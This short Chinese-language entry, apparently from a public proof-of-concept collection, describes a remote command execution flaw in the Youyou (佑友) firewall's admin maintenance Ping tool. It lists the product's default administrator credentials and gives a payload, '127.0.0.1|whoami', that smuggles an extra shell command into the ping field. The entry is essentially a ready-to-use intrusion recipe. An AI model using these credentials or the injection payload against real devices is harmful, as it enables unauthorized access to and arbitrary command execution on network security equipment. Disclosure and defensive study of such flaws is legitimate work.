# 佑友防火墙 后台RCE/默认口令

佑友防火墙后台维护工具存在命令执行，由于没有过滤危险字符，导致可以执行任意命令。

默认密码：admin/hicomadmin

RCE：

系统管理 >> 维护工具 >> Ping

PoC：


```
127.0.0.1|whoami
```

via:peiqi